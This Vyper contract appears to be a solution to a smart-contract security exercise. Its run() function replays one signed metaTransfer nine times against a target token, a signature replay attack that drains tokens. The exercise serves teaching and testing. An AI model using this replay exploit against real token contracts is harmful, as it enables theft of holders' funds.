# @version ^0.3.2

"""
@title Token with Meta Transaction Exploit
"""

interface Token:
    def transfer(receiver: address, amount: uint256) -> bool: nonpayable
    def approve(spender: address, amount: uint256) -> bool: nonpayable
    def transferFrom(sender: address, receiver: address, amount: uint256) -> bool: nonpayable
    def name() -> String[32]: view
    def symbol() -> String[32]: view
    def decimals() -> uint8: view
    def totalSupply() -> uint256: view
    def balanceOf(owner: address) -> uint256: view
    def allowance(owner: address, spender: address) -> uint256: view
    def metaTransfer(
        sender: address,
        receiver: address,
        amount: uint256,
        v: uint256,
        r: uint256,
        s: uint256
    ) -> bool: nonpayable

target: address

@external
def __init__(target: address):
    self.target = target

# YOUR EXPLOIT HERE
@external
def run(
    sender: address,
    receiver: address,
    amount: uint256,
    v: uint256,
    r: uint256,
    s: uint256
):
    for i in range(9):
        Token(self.target).metaTransfer(sender, receiver, amount, v, r, s)
